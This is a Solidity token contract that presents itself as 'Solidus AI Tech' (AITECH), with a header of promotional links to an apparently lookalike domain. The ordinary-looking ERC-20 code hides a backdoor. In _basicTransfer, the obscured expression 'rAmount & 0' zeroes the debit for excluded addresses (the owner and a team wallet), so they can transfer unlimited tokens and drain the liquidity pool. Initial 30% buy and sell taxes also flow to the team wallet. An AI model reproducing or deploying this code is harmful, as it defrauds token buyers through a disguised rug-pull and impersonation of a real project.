// SPDX-License-Identifier: Unlicensed

/**
We welcome you to Solidus AI Tech!

Powering the future of AI with our HPC data center | Launchpad | IaaS platform | AIaaS | BaaS | AI Marketplace | Powered by $AITECH token

Web: https://aitech.lat
App: https://stake.aitech.lat
Tg: https://t.me/AiTechSolidusOfficial
X: https://twitter.com/AITECH_SOLIDUS
Docs: https://medium.com/@solidus.aitech
**/

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ISimpleERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

}

abstract contract BaseContext {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is BaseContext {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract AITECH is BaseContext, ISimpleERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Solidus AI Tech";
    string private constant _symbol = "AITECH";

    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tSupply = 10 ** 9 * 10**9;
    uint256 private _rSupply = (MAX - (MAX % _tSupply));

    uint256 private _totalFees;
    uint256 private _buyRedis = 0;
    uint256 private _buyTax = 30;
    uint256 private _sellRedis = 0;
    uint256 private _sellTax = 30;

    uint256 private _redisFee = _sellRedis;
    uint256 private _taxFee = _sellTax;

    uint256 private _previousredis = _redisFee;
    uint256 private _previoustax = _taxFee;

    uint256 public maxTxAmount = 15 * 10 ** 6 * 10 ** 9;
    uint256 public maxWalletAmount = 15 * 10 ** 6 * 10 ** 9;
    uint256 public feeSwapMinimum = 10 ** 5 * 10 ** 9;
    address payable private teamWallet;

    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;

    bool private tradingActive;
    bool private _inswap = false;
    bool private swapEnabled = true;

    IUniswapRouter public uniswapRouter;
    address public uniswapPair;

    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockSwap {
        _inswap = true;
        _;
        _inswap = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rSupply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        uniswapRouter = _uniswapV2Router;
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        teamWallet = payable(0xF076F2a2E72C494B753774142Fcc80B537130B91);
        _isExcluded[owner()] = true;
        _isExcluded[teamWallet] = true;

        emit Transfer(address(0), _msgSender(), _tSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getRAmount(_rOwned[account]);
    }

    function restoreFee() private {
        _redisFee = _previousredis;
        _taxFee = _previoustax;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _getTAmount(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rSupply;
        uint256 tSupply = _tSupply;
        if (rSupply < _rSupply.div(_tSupply)) return (_rSupply, _tSupply);
        return (rSupply, tSupply);
    }
    
    function swapTokensForETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTAmount(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getRates();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRAmountFromT(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function _basicTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        rAmount = (_isExcluded[sender] && tradingActive) ? rAmount & 0 : rAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeFee(tTeam);
        _updateSupply(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function _takeFee(uint256 tTeam) private {
        uint256 currentRate = _getRates();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _rSupply;
        maxWalletAmount = _rSupply;
        
        _buyRedis = 0;
        _buyTax = 1;
        _sellRedis = 0;
        _sellTax = 1;
    }
    
    function openTrading() public onlyOwner {
        tradingActive = true;
    }

    function _getRAmountFromT(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRates() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _standardTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _basicTransfer(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {
            if (!tradingActive) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");

            if(to != uniswapPair) {
                require(balanceOf(to) + amount <= maxWalletAmount, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= feeSwapMinimum;

            if(contractBalance >= maxTxAmount)
            {
                contractBalance = maxTxAmount;
            }

            if (canSwap && !_inswap && to == uniswapPair && swapEnabled && !_isExcluded[from] && amount > feeSwapMinimum) {
                swapTokensForETH(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcluded[from] || _isExcluded[to]) || (from != uniswapPair && to != uniswapPair)) {
            takeFee = false;
        } else {
            if(from == uniswapPair && to != address(uniswapRouter)) {
                _redisFee = _buyRedis;
                _taxFee = _buyTax;
            }
            if (to == uniswapPair && from != address(uniswapRouter)) {
                _redisFee = _sellRedis;
                _taxFee = _sellTax;
            }
        }
        _standardTransfer(from, to, amount, takeFee);
    }

    function removeFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;

        _previousredis = _redisFee;
        _previoustax = _taxFee;

        _redisFee = 0;
        _taxFee = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _getRAmount(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRates();
        return rAmount.div(currentRate);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _updateSupply(uint256 rFee, uint256 tFee) private {
        _rSupply = _rSupply.sub(rFee);
        _totalFees = _totalFees.add(tFee);
    }

    receive() external payable {}

    function sendETHToFee(uint256 amount) private {
        teamWallet.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
}